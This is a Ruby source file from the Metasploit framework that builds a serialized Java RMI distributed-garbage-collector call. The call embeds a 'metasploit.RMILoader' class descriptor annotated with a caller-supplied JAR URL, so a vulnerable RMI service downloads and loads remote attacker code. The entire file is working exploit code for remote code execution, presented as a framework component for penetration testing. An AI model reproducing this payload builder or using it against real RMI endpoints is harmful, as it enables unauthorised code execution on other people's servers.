# -*- coding: binary -*-

require 'rex/java/serialization'

module Msf
  module Rmi
    module Client
      module Streams

        def build_gc_call(jar_url)
          stream = Rex::Java::Serialization::Model::Stream.new

          block_data = Rex::Java::Serialization::Model::BlockData.new
          block_data.contents = "\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf6\xb6\x89\x8d\x8b\xf2\x86\x43"
          block_data.length = block_data.contents.length

          stream.contents << block_data

          new_array_annotation = Rex::Java::Serialization::Model::Annotation.new
          new_array_annotation.contents = [
              Rex::Java::Serialization::Model::NullReference.new,
              Rex::Java::Serialization::Model::EndBlockData.new
          ]

          new_array_super = Rex::Java::Serialization::Model::ClassDesc.new
          new_array_super.description = Rex::Java::Serialization::Model::NullReference.new

          new_array_desc = Rex::Java::Serialization::Model::NewClassDesc.new
          new_array_desc.class_name =  Rex::Java::Serialization::Model::Utf.new(nil, '[Ljava.rmi.server.ObjID;')
          new_array_desc.serial_version = 0x871300b8d02c647e
          new_array_desc.flags = 2
          new_array_desc.fields = []
          new_array_desc.class_annotation = new_array_annotation
          new_array_desc.super_class = new_array_super

          array_desc = Rex::Java::Serialization::Model::ClassDesc.new
          array_desc.description = new_array_desc

          new_array = Rex::Java::Serialization::Model::NewArray.new
          new_array.type = 'java.rmi.server.ObjID;'
          new_array.values = []
          new_array.array_description = array_desc

          stream.contents << new_array
          stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00\x00\x00\x00\x00\x00\x00\x00")

          new_class_desc = Rex::Java::Serialization::Model::NewClassDesc.new
          new_class_desc.class_name = Rex::Java::Serialization::Model::Utf.new(nil, 'metasploit.RMILoader')
          new_class_desc.serial_version = 0xa16544ba26f9c2f4
          new_class_desc.flags = 2
          new_class_desc.fields = []
          new_class_desc.class_annotation = Rex::Java::Serialization::Model::Annotation.new
          new_class_desc.class_annotation.contents = [
              Rex::Java::Serialization::Model::Utf.new(nil, jar_url),
              Rex::Java::Serialization::Model::EndBlockData.new
          ]
          new_class_desc.super_class = Rex::Java::Serialization::Model::ClassDesc.new
          new_class_desc.super_class.description = Rex::Java::Serialization::Model::NullReference.new

          new_object = Rex::Java::Serialization::Model::NewObject.new
          new_object.class_desc = Rex::Java::Serialization::Model::ClassDesc.new
          new_object.class_desc.description = new_class_desc
          new_object.class_data = []

          stream.contents << new_object

          stream.contents << Rex::Java::Serialization::Model::BlockData.new(nil, "\x00")

          stream
        end
      end
    end
  end
end
